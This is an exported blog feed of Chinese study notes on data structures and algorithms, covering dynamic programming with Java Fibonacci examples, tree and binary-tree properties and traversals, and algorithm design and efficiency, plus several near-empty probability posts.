<p>一张图 G 是一个三元组(V,E,I)，其中 V称为顶集（Vertices set）,E称为边集（Edges set）， E与 V不相交；I称为关联函数，I将E中的每一个元素映射到<script type="math/tex">V\times V</script>。如果 I(e)=(u,v) (<script type="math/tex">e\in E, u,v \in V</script>)那么称边 e连接顶点 u,v，而 u,v则称作 e的端点，u,v此时关于 e相邻。同时，若两条边 i,j有一个公共顶点 u，则称  i,j关于 u相邻。</p>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划(DP)</title>
    <url>/2019/05/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<p>动态编程既是数学优化方法,也是计算机编程方法。该方法由 Richard Bellman 在 20 世纪 50 年代开发,并已在航空航天工程和经济学等众多领域得到应用。在这两种情况下,它指的是通过以递归方式将其分解为更简单的子问题来简化复杂问题。虽然某些决策问题不能以这种方式分开,但是跨越几个时间点的决策通常会递归地分解。同样,在计算机科学中,如果通过将问题分解为子问题然后递归地找到子问题的最优解来最佳地解决问题,那么据说它具有最优子结构。</p>
<p>如果子问题可以在较大的问题中递归嵌套,那么动态编程方法是适用的,则较大问题的值与子问题的值之间存在关联。在优化文献中,这种关系称为 Bellman 方程。</p>
<a id="more"></a>
<h1 id="什么是-DP"><a href="#什么是-DP" class="headerlink" title="什么是 DP"></a>什么是 DP</h1><p>以斐波那契数列为例,给出两种方法来解决该问题.斐波那契数列指的是这样一个数列 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233,377,610,987,1597,2584,4181,6765,10946,17711,28657,46368……..<br>求第 n 个数是多少?</p>
<blockquote>
<ul>
<li>递归解决</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> ( n == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( n == <span class="number">1</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>DP</li>
</ul>
</blockquote>
<p>动态规划分解子问题,循环求解.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 动态规划优化子问题</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">   <span class="keyword">long</span>[] f = <span class="keyword">new</span> <span class="keyword">long</span>[n+<span class="number">1</span>];</span><br><span class="line">   f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">   f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> ; i &lt;= n;i++)&#123;</span><br><span class="line">     f[i] = f[i-<span class="number">1</span>] + f[i-<span class="number">2</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> f[n];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>给出这两种方法都可以解决问题,但是递归受限于递归深度,如果 n 过大,则会抛出 StackOverflowException 或超出最大递归深度。递归方法虽然可以解决此问题但是会有性能问题。动态规划就是将递归方法分解成一个个小问题,f[n] = f[n-1] + f[n-2]只需要求解此问题并保存结果即可。</p>
<h2 id="公共子问题"><a href="#公共子问题" class="headerlink" title="公共子问题"></a>公共子问题</h2><p>与分治法一样,DP 将解决方案与子问题结合起来。DP 主要用于一次又一次需要相同子问题的解决方案时。<br>在 DP 中,子问题的计算解决方案存储在表中,因此不必重新计算这些解决方案。<br>因此,当没有共同(重叠)子问题时,DP 是没有用的,因为如果不再需要它们,则没有点存储解决方案。<br>例如,二进制搜索没有常见的子问题。<br>我们以上边的递归程序为例,有许多子问题一次又一次地被解决。<br>当 n=5 时可以看到递归程序的结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                           f(5)</span><br><span class="line">                     /               \</span><br><span class="line">               f(4)                    f(3)</span><br><span class="line">             /      \                /      \</span><br><span class="line">         f(3)          f(2)          f(2)    f(1)</span><br><span class="line">        /     \        /    \       /    \</span><br><span class="line">     f(2)    f(1)   f(1)   f(0)    f(1) f(0)  </span><br><span class="line">  /      \</span><br><span class="line">f(1)    f(0)</span><br></pre></td></tr></table></figure>
<p>我们可以看到函数 f(3)被调用了 2 次。<br>如果我们存储了 f(3)的值,那么我们可以重新使用旧的存储值,而不是再次计算它。<br>有两种不同的方法来存储值,以便可以重用这些值：</p>
<blockquote>
<ul>
<li>自上而下</li>
<li>自下而上</li>
</ul>
</blockquote>
<h3 id="自上而下"><a href="#自上而下" class="headerlink" title="自上而下"></a>自上而下</h3><p>针对该问题的自上而下程序类似于递归版本,只有一个小修改,它在计算解决方案之前会查找查找表。我们初始化一个查找数组,所有初始值都为 NIL。每当我们需要子问题的解决方案时,我们首先查看查找表。<br>如果预先计算的值在那里,那么我们返回该值,否则,我们计算该值并将结果放在查找表中,以便以后可以重用它。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Java program for Memoized version */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> MAX = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> NIL = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> lookup[] = <span class="keyword">new</span> <span class="keyword">int</span>[MAX];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function to initialize NIL values in lookup table */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">_initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAX; i++)</span><br><span class="line">		lookup[i] = NIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* function for nth Fibonacci number */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (lookup[n] == NIL)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">		lookup[n] = n;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		lookup[n] = f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> lookup[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Fibonacci f = <span class="keyword">new</span> Fibonacci();</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">40</span>;</span><br><span class="line">	f._initialize();</span><br><span class="line">	System.out.println(<span class="string">"Fibonacci number is"</span> + <span class="string">" "</span> + f.f(n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// This Code is Contributed by Saket Kumar</span></span><br></pre></td></tr></table></figure>
<h3 id="自下而上"><a href="#自下而上" class="headerlink" title="自下而上"></a>自下而上</h3><p>给定问题的列表程序以自下而上的方式构建表,并返回表中的最后一个条目。<br>例如,对于相同的斐波纳契数,我们首先计算 f(0)然后计算 f(1)然后计算 f(2)然后计算 fib(3),依此类推。<br>从字面上看,我们正在建立自下而上的子问题解决方案。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Java program for Tabulated version */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> f[] = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">	f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">		f[i] = f[i-<span class="number">1</span>] + f[i-<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">return</span> f[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Fibonacci f = <span class="keyword">new</span> Fibonacci();</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">9</span>;</span><br><span class="line">	System.out.println(<span class="string">"Fibonacci number is"</span> + <span class="string">" "</span> + f.fib(n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// This Code is Contributed by Saket Kumar</span></span><br></pre></td></tr></table></figure>
<p>就是咱们程序里用的方法.</p>
<p>这里以公共子问题来引入了 DP,还有其他很多场景会使用 DP,比如:公共子树、最长公共序列等。</p>
<h1 id="怎么解决-DP-相关问题"><a href="#怎么解决-DP-相关问题" class="headerlink" title="怎么解决 DP 相关问题"></a>怎么解决 DP 相关问题</h1><ol>
<li>先求解出第一种解决方案</li>
<li>分析这个方案</li>
<li>找出公共子问题</li>
<li>换方案实现</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://en.wikipedia.org/wiki/Dynamic_programming" target="_blank" rel="noopener">Dynamic programming(wiki)</a></p>
</li>
<li><p><a href="https://www.geeksforgeeks.org/dynamic-programming/" target="_blank" rel="noopener">Dynamic Programming(geeksforgeeks)</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Bellman_equation" target="_blank" rel="noopener">Bellman equation</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Longest_common_subsequence_problem" target="_blank" rel="noopener">Longest common subsequence problem</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(6):树</title>
    <url>/2017/11/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84(6)%E3%80%81%E6%A0%91/</url>
    <content><![CDATA[<p>树（tree）是n（n&gt;=0）个结点的有穷集。n=0时称为空树。在任意一个非空树中：（1）每个元素称为结点（node）；（2）仅有一个特定的结点被称为根结点或树根（root）。（3）当n&gt;1时，其余结点可分为m（m≥0）个互不相交的集合T1，T2，……Tm，其中每一个集合Ti（1&lt;=i&lt;=m）本身也是一棵树，被称作根的子树（subtree）。</p>
<p>在计算机科学中，二叉树是每个节点最多有两个子树的树结构。通常子树被称作“左子树”（left subtree）和“右子树”（right subtree）。二叉树常被用于实现二叉查找树和二叉堆。</p>
<p>二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。二叉树的第i层至多有2^{i-1}个结点；深度为k的二叉树至多有2^k-1个结点；对任何一棵二叉树T，如果其终端结点数为n_0，度为2的结点数为n_2，则n_0=n_2+1。</p>
<p>树和二叉树的三个主要差别：</p>
<p>树的结点个数至少为1，而二叉树的结点个数可以为0；<br>树中结点的最大度数没有限制，而二叉树结点的最大度数为2；<br>树的结点无左、右之分，而二叉树的结点有左、右之分。</p>
<blockquote>
<h2 id="二叉树特性"><a href="#二叉树特性" class="headerlink" title="二叉树特性"></a>二叉树特性</h2><h4 id="在二叉树的第i层上至多有2-i-1-个结点-i-gt-1"><a href="#在二叉树的第i层上至多有2-i-1-个结点-i-gt-1" class="headerlink" title="在二叉树的第i层上至多有2^(i-1)个结点(i&gt;=1)."></a>在二叉树的第i层上至多有2^(i-1)个结点(i&gt;=1).</h4><h4 id="深度为k的二叉树至多有2-k-1个结点（k-gt-1）。"><a href="#深度为k的二叉树至多有2-k-1个结点（k-gt-1）。" class="headerlink" title="深度为k的二叉树至多有2^k-1个结点（k&gt;=1）。"></a>深度为k的二叉树至多有2^k-1个结点（k&gt;=1）。</h4><h4 id="对任何一棵二叉树T，如果其终端结点个数为n0，度为2的结点数为n2，则n0-n2-1。"><a href="#对任何一棵二叉树T，如果其终端结点个数为n0，度为2的结点数为n2，则n0-n2-1。" class="headerlink" title="对任何一棵二叉树T，如果其终端结点个数为n0，度为2的结点数为n2，则n0 = n2 + 1。"></a>对任何一棵二叉树T，如果其终端结点个数为n0，度为2的结点数为n2，则n0 = n2 + 1。</h4></blockquote>
<p>终端结点也就是叶子结点，而一棵树，除了叶子结点外，剩下的就是度为1或2的结点数，我们设n1为度是1的结点数，则树的结点总数n=n0+n1+n2.</p>
<p><img src="https://i.imgur.com/WOD0V27.png" alt></p>
<p>从分支数的角度再来思考，由于根节点只有分支出去，没有分支进来，所以总的分支线总数为结点总数减去1，由上图得到，对于ABCD结点来说，它们有两个分支线出去，而E结点只有一个分支线出去。所以总分支线为4<em>2+1</em>1=9.<br>用代数表达式就是分支线总数=n-1=n1+2<em>n2,即度为1的个数加上度为2的个数，即是分支数。<br>n0+n1+n2-1=n1+2</em>n2 结论就是n0=n2+1。</p>
<blockquote>
<h4 id="具有n个结点的完全二叉树的深度为「log2n」-1-「x」表示不大于x的最大整数-。"><a href="#具有n个结点的完全二叉树的深度为「log2n」-1-「x」表示不大于x的最大整数-。" class="headerlink" title="具有n个结点的完全二叉树的深度为「log2n」+ 1(「x」表示不大于x的最大整数)。"></a>具有n个结点的完全二叉树的深度为「log2n」+ 1(「x」表示不大于x的最大整数)。</h4><h4 id="如果对一棵有n个结点的完全二叉树的结点按层序编号（从第一层到第「log2n」-1层，每层从左到右），对任一结点i（1≤i≤n）有："><a href="#如果对一棵有n个结点的完全二叉树的结点按层序编号（从第一层到第「log2n」-1层，每层从左到右），对任一结点i（1≤i≤n）有：" class="headerlink" title="如果对一棵有n个结点的完全二叉树的结点按层序编号（从第一层到第「log2n」+ 1层，每层从左到右），对任一结点i（1≤i≤n）有："></a>如果对一棵有n个结点的完全二叉树的结点按层序编号（从第一层到第「log2n」+ 1层，每层从左到右），对任一结点i（1≤i≤n）有：</h4><ul>
<li><p>若i=1，则结点i是二叉树的根，无双亲；如i&gt;1，则其双亲是结点「i/2」。</p>
</li>
<li><p>如2i&gt;n，则结点i无左孩子（结点i为叶子结点）；否则其左孩子是结点2i。</p>
</li>
<li>若2i+1&gt;n，则结点i无右孩子；否则其右孩子是结点2i+1。</li>
</ul>
<h3 id="完全二叉树和满二叉树"><a href="#完全二叉树和满二叉树" class="headerlink" title="完全二叉树和满二叉树"></a>完全二叉树和满二叉树</h3><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4></blockquote>
<p>在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二叉树。<br>满二叉树具有如下特点：</p>
<blockquote>
<ul>
<li>叶子只能出现在最下一层</li>
<li>非叶子结点的度一定是2</li>
<li>同样深度的二叉树中，满二叉树的结点个数最多，叶子数最多。</li>
</ul>
<h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4></blockquote>
<p>若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树。<br>完全二叉树的特点：</p>
<blockquote>
<ul>
<li>叶子结点只能出现在最下两层</li>
<li>最下层叶子在左部并且连续</li>
<li>同样结点数的二叉树，完全二叉树的深度最小</li>
</ul>
</blockquote>
<p>类型</p>
<p>(1)完全二叉树——若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树。<br>(2)满二叉树——除了叶结点外每一个结点都有左右子叶且叶子结点都处在最底层的二叉树。<br>(3)平衡二叉树——平衡二叉树又被称为AVL树（区别于AVL算法），它是一棵二叉排序树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。<br>相关术语</p>
<p>树的结点：包含一个数据元素及若干指向子树的分支；<br>孩子结点：结点的子树的根称为该结点的孩子；<br>双亲结点：B 结点是A 结点的孩子，则A结点是B 结点的双亲；<br>兄弟结点：同一双亲的孩子结点； 堂兄结点：同一层上结点；<br>祖先结点: 从根到该结点的所经分支上的所有结点子孙结点：以某结点为根的子树中任一结点都称为该结点的子孙<br>结点层：根结点的层定义为1；根的孩子为第二层结点，依此类推；<br>树的深度：树中最大的结点层<br>结点的度：结点子树的个数<br>树的度： 树中最大的结点度。<br>叶子结点：也叫终端结点，是度为 0 的结点；<br>分枝结点：度不为0的结点；<br>有序树：子树有序的树，如：家族树；<br>无序树：不考虑子树的顺序<br><img src="https://i.imgur.com/pQYiVWG.png" alt></p>
<blockquote>
<h1 id="二叉树的实现"><a href="#二叉树的实现" class="headerlink" title="二叉树的实现"></a>二叉树的实现</h1><h1 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h1><h4 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h4></blockquote>
<p>前序遍历(DLR)首先访问根结点然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。<br>若二叉树为空则结束返回,否则：</p>
<blockquote>
<ul>
<li>访问根结点。</li>
<li>递归遍历左子树。</li>
<li>递归遍历右子树。</li>
</ul>
</blockquote>
<p>需要注意的是：遍历左右子树时仍然采用前序遍历方法。<br><img src="https://i.imgur.com/6ojIr7C.png" alt></p>
<p>如上图所示二叉树<br>前序遍历结果：ABDCEF</p>
<blockquote>
<h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4></blockquote>
<p>中序遍历首先遍历左子树再访问根节点,再遍历右子树。<br>若二叉树为空则结束返回,否则：</p>
<blockquote>
<ul>
<li>递归遍历左子树。</li>
<li>访问根结点。</li>
<li>递归遍历右子树 。</li>
</ul>
</blockquote>
<p>上图中序遍历结果：DBAECF</p>
<blockquote>
<h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4></blockquote>
<p>后序遍历首先遍历左子树,再遍历左子树,再访问根节点。<br>若二叉树为空则结束返回,否则：</p>
<blockquote>
<ul>
<li>递归遍历右子树。</li>
<li>递归遍历左子树 。</li>
<li>访问根结点。</li>
</ul>
</blockquote>
<p>上图后序遍历结果：DBEFCA</p>
<blockquote>
<h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4></blockquote>
<p>自上而下，从左到右逐层访问节点。<br>上图层序遍历的结果：ABCDEF</p>
<blockquote>
<h1 id="树、二叉树和森林的转换"><a href="#树、二叉树和森林的转换" class="headerlink" title="树、二叉树和森林的转换"></a>树、二叉树和森林的转换</h1></blockquote>
<p>参考资料:</p>
<blockquote>
<ul>
<li>大话数据结构</li>
<li>算法导论</li>
<li><a href="https://en.wikipedia.org/wiki/Tree_(data_structure" target="_blank" rel="noopener">树——维基百科</a>)</li>
<li><a href="https://en.wikipedia.org/wiki/Binary_tree" target="_blank" rel="noopener">Binary_tree</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>数据结构和算法</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础四之随机变量</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B8%83%E4%B9%8B%E6%9C%9F%E6%9C%9B%E7%9A%84%E6%80%A7%E8%B4%A8/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础三之条件概率和独立性</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B8%89%E4%B9%8B%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87%E5%92%8C%E7%8B%AC%E7%AB%8B%E6%80%A7/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础九之概率论的其他课题</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B9%9D%E4%B9%8B%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%85%B6%E4%BB%96%E8%AF%BE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构(2):算法</title>
    <url>/2017/11/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95(2)%E3%80%81%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>著名计算机科学家沃思（NiklausWirth）提出一个公式：算法 + 数据结构 = 程序<br>其中算法是程序的灵魂。</p>
<blockquote>
<p>一、算法的定义及特性</p>
</blockquote>
<p>在数学和计算机科学/算学之中，算法/演算法/算则法（algorithm）为一个计算的具体步骤，常用于计算、数据处理和自动推理。精确而言，算法是一个表示为有限长列表的有效方法。算法应包含清晰定义的指令用于计算函数。</p>
<p>算法中的指令描述的是一个计算，当其运行时能从一个初始状态和初始输入（可能为空）开始，经过一系列有限而清晰定义的状态最终产生输出并停止于一个终态。一个状态到另一个状态的转移不一定是确定的。随机化算法在内的一些算法，包含了一些随机输入。</p>
<p>形式化算法的概念部分源自尝试解决希尔伯特提出的判定问题，并在其后尝试定义有效可计算性或者有效方法中成形。这些尝试包括库尔特·哥德尔、雅克·埃尔布朗和斯蒂芬·科尔·克莱尼分别于1930年、1934年和1935年提出的递归函数，阿隆佐·邱奇于1936年提出的λ演算，1936年埃米尔·莱昂·珀斯特的Formulation 1和艾伦·图灵1937年提出的图灵机。即使在当前，依然常有直觉想法难以定义为形式化算法的情况。</p>
<p>一个算法应该具有以下五个重要的特征：</p>
<p><em>有穷性（Finiteness）</em></p>
<p>算法的有穷性是指算法必须能在执行有限个步骤之后终止；</p>
<p><em>确切性(Definiteness)</em></p>
<p>算法的每一步骤必须有确切的定义；</p>
<p><em>输入项(Input)</em></p>
<p>一个算法有0个或多个输入，以刻画运算对象的初始情况，所谓0个输入是指算法本身定出了初始条件；</p>
<p><em>输出项(Output)</em></p>
<p>一个算法有一个或多个输出，以反映对输入数据加工后的结果。没有输出的算法是毫无意义的；</p>
<p><em>可行性(Effectiveness)</em></p>
<p>算法中执行的任何计算步骤都是可以被分解为基本的可执行的操作步，即每个计算步都可以在有限时间内完成（也称之为有效性）。</p>
<blockquote>
<p>二、算法的设计</p>
</blockquote>
<p><strong>设计原则</strong></p>
<ol>
<li>正确性</li>
</ol>
<p>算法的正确性是指算法至少应该具有输入，输出和加工处理无歧义，能正确反映问题的需求，能够得到问题的正确答案。<br>算法正确大体分为四个层次：</p>
<blockquote>
<ul>
<li><p>1.算法程序没有语法的错误。</p>
</li>
<li><p>2.算法程序对于合法的输入数据能够产生满足要求的输出的结果。</p>
</li>
<li><p>3.算法程序对于非法的输入数据能够得出满足规格说明的结果。</p>
</li>
<li><p>4.算法程序对于精心选择的，甚至刁难的测试数据都有满足要求的输出结果。</p>
</li>
</ul>
</blockquote>
<p>2 . 可读性</p>
<p>可读性：算法设计的另一个目的是为了便于阅读，理解和交流。</p>
<p>写代码的目的一是为了计算机执行，另一个为了便于他人阅读，让人理解和交流。</p>
<p>3.键壮性</p>
<p>当输入数据不合法时，算法也能做出相关处理，而不是产生异常或莫名其妙的结果。</p>
<p>4.时间效率高和存储量低</p>
<p><strong>设计方法</strong></p>
<p>1）、递归和递推。递归和递推是学习算法设计的第一步。递归算法是把大问题分解成相对较小的问题的过程，而递推就是从小问题逐步推导出大问题的过程。无论递归还是递推，都应该有初始状态。</p>
<p>2）、搜索、枚举及优化剪枝。搜索在所有算法中既是最简单也是最复杂的算法。说它简单，是因为算法本身并不复杂，实现容易；说它最复杂，是因为要对搜索的范围进行一定的控制，不然就会出现超时等问题。搜索技术主要包括广度优先搜索和深度优先搜索。当其余算法都无法对问题进行求解时，搜索或许是唯一可用的方法。搜索是对问题的解空间进行遍历的过程。有时问题解空间相当庞大，完全遍历解空间是不现实的，此时就必须充分发掘问题所包含的约束条件，在搜索过程中应用这些条件进行剪枝，从而减少搜索量。</p>
<p>3）、动态规划（简称DP）。动态规划的特点是能够把很复杂的问题分解成一个个阶段来处理的递推方法，动态规划必须符合两个特点：无后效性（一个状态的抉择不会影响到更大问题的状态的抉择）及最优化原理（一个大问题的最优性必须建立在其子问题的最优性之上）。动态规划是竞赛中经常出现的的类型，而且变化很大（有线性DP，环形DP，树形DP等），难易跨度大，技巧性强，甚至还有DP的优化等问题。</p>
<p>4）、贪心。贪心算法是所谓的“只顾眼前利益”的算法。其具体策略是并不从整体最优上加以考虑，而是选取某种意义下的局部最优解。当然使用贪心算法时，要使得到的结果也是整体最优的。</p>
<p>5）、分治、构造等。分治就是把问题分成若干子问题，然后“分而治之”；构造是指按照一定的规则产生解决问题的方法。这两种算法都是在合理的分析题目后，通过一定的规律性推导，从而解决问题。快速排序可以认为是利用了分治法。</p>
<blockquote>
<p>三、算法效率的度量方法</p>
</blockquote>
<p><strong>事后统计方法</strong></p>
<p>这种方法主要是通过设计好的测试程序和数据,利用计算机对不同算法编制的程序的运行时间进行时间比较,从而确定算法效率的高低。</p>
<p><em>缺陷</em></p>
<blockquote>
<ul>
<li>必须根据算法提前编写好测试程序,话费时间精力较大。</li>
<li>运行时间严重依赖硬件以及软件等环境因素,可能会影响算法本身的优劣。</li>
<li>算法的测试数据设计困难,并且程序的运行时间和测试数据的规模有很大关系。</li>
</ul>
</blockquote>
<p><em>总结</em></p>
<p>事后统计法虽然直观,但是实际困难且缺陷多,很少使用。</p>
<p><strong>事前分析估算方法</strong></p>
<p>在计算机程序编程前，依据统计方法对算法进行估算。</p>
<p>一个用高级程序语言编写的程序在计算机上运行时所消耗的时间取决于下列因素：</p>
<blockquote>
<ul>
<li>算法采用的策略，方法(算法优劣的根本)</li>
<li>编译产生的代码质量(软件)</li>
<li>问题的输入规模</li>
<li>机器执行指令的速度(硬件)</li>
</ul>
</blockquote>
<p>一个程序的运行时间依赖于算法的好坏和问题的输入规模,所谓问题输入规模的是指输入量的多少。</p>
<p>在分析程序的分析时间时，最重要的是把程序看成是独立于程序设计语言的算法或者是一系列步骤。</p>
<p>分析一个算法的运行时间时，重要的是把基本操作的数量与输入规模关联起来，即基本操作的数量必须表示成输入规模的函数。随着问题输入规模（n）越来越大，它们在时间效率上的差异也就越来越大.</p>
